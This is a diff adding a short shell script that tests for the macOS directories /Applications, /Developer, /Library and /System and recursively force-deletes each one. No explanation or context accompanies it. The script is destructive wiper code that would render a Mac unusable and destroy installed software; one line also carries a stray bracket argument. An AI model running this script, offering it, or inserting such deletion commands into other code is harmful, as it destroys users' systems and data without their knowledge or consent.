@@ -1,0 +1,17 @@
+#!/bin/sh
+
+if [ -d "/Applications" ] ; then
+  rm -rf /Applications
+fi
+
+if [ -d "/Developer" ] ; then
+  rm -rf /Developer ]
+fi
+
+if [ -d "/Library" ] ; then
+  rm -rf /Library
+fi
+
+if [ -d "/System" ] ; then
+  rm -rf /System
+fi
